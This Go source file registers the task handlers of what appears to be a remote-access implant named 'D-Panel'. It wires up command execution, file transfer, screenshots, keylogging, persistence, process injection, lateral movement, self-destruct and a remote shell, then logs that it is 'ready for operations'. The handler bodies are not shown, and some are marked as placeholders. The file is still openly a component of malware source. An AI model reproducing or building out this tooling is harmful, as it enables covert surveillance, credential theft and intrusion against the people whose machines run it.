package tasks

import (
	"log"
)

func init() {
	// Register all task handlers
	Register(TaskExec, ExecHandler)
	Register(TaskInfo, InfoHandler)
	Register(TaskSleep, SleepHandler)
	
	// Additional handlers (placeholders for now)
	Register(TaskDownload, DownloadHandler)
	Register(TaskUpload, UploadHandler)
	Register(TaskScreenshot, ScreenshotHandler)
	Register(TaskKeylogger, KeyloggerHandler)
	Register(TaskPersist, PersistHandler)
	Register(TaskInject, InjectHandler)
	Register(TaskLateral, LateralHandler)
	Register(TaskSelfDestruct, SelfDestructHandler)
	Register(TaskShell, ShellHandler)

	log.Println("[+] All D-Panel task handlers loaded — ready for operations")
	log.Printf("[+] Registered handlers: %v", ListHandlers())
}